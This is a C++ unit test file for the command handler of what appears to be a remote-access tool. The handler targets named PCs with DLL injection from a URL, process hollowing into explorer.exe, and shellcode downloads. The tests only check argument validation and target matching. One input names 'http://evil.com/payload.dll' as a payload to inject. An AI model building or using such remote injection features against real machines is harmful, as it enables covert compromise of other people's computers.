#include <gtest/gtest.h>

#include "application/commands/InjectHandler.hpp"
#include "../mocks/MockReporter.hpp"

using namespace nuub::application::commands;
using namespace nuub::tests::mocks;

class InjectHandlerTest : public ::testing::Test {
protected:
    MockReporter reporter;

    InjectHandler create_handler() {
        return InjectHandler(reporter, "PC-Test");
    }
};

// ── Target matching ───────────────────────────────────────────

TEST_F(InjectHandlerTest, CorrectTargetMatches) {
    auto handler = create_handler();
    // handle_inject with empty extra shows usage — proves target matched
    handler.handle_inject("PC-Test", "");
    EXPECT_FALSE(reporter.messages.empty());
}

TEST_F(InjectHandlerTest, WrongTargetIgnored) {
    auto handler = create_handler();
    handler.handle_inject("Other-PC", "1234 http://evil.com/payload.dll");
    EXPECT_TRUE(reporter.messages.empty());
}

TEST_F(InjectHandlerTest, AllTargetMatches) {
    auto handler = create_handler();
    handler.handle_inject("all", "");
    EXPECT_FALSE(reporter.messages.empty());
}

// ── Argument validation ───────────────────────────────────────

TEST_F(InjectHandlerTest, EmptyExtraShowsUsage) {
    auto handler = create_handler();
    handler.handle_inject("PC-Test", "");
    EXPECT_TRUE(reporter.messages[0].first.find("Uso") != std::string::npos);
}

TEST_F(InjectHandlerTest, InvalidPidShowsUsage) {
    auto handler = create_handler();
    // Only one arg (no URL), should show usage
    handler.handle_inject("PC-Test", "abc");
    EXPECT_TRUE(reporter.messages[0].first.find("Uso") != std::string::npos);
}

TEST_F(InjectHandlerTest, ZeroPidRejected) {
    auto handler = create_handler();
    handler.handle_inject("PC-Test", "0 http://example.com/dll.dll");
    EXPECT_TRUE(reporter.messages[0].first.find("invalido") != std::string::npos);
}

TEST_F(InjectHandlerTest, NonNumericPidRejected) {
    auto handler = create_handler();
    handler.handle_inject("PC-Test", "not_a_number http://example.com/dll.dll");
    EXPECT_TRUE(reporter.messages[0].first.find("invalido") != std::string::npos);
}

// ── Hollow ────────────────────────────────────────────────────

TEST_F(InjectHandlerTest, HollowEmptyTargetShowsUsage) {
    auto handler = create_handler();
    handler.handle_hollow("PC-Test", "");
    EXPECT_TRUE(reporter.messages[0].first.find("Uso") != std::string::npos);
}

TEST_F(InjectHandlerTest, HollowWrongTargetIgnored) {
    auto handler = create_handler();
    handler.handle_hollow("Other-PC", "explorer.exe");
    EXPECT_TRUE(reporter.messages.empty());
}

// ── Shellcode ─────────────────────────────────────────────────

TEST_F(InjectHandlerTest, ShellcodeEmptyUrlShowsUsage) {
    auto handler = create_handler();
    handler.handle_shellcode("PC-Test", "");
    EXPECT_TRUE(reporter.messages[0].first.find("Uso") != std::string::npos);
}

TEST_F(InjectHandlerTest, ShellcodeWrongTargetIgnored) {
    auto handler = create_handler();
    handler.handle_shellcode("Other-PC", "http://example.com/shell.bin");
    EXPECT_TRUE(reporter.messages.empty());
}

TEST_F(InjectHandlerTest, ShellcodeInvalidUrlFailsGracefully) {
    auto handler = create_handler();
    // Use an invalid URL to trigger CURL failure
    handler.handle_shellcode("PC-Test", "http://invalid.invalid.invalid/shell.bin");
    // Should report an error, not crash
    EXPECT_FALSE(reporter.messages.empty());
    bool has_error = false;
    for (const auto& m : reporter.messages) {
        if (m.first.find("Error") != std::string::npos) {
            has_error = true;
            break;
        }
    }
    EXPECT_TRUE(has_error);
}
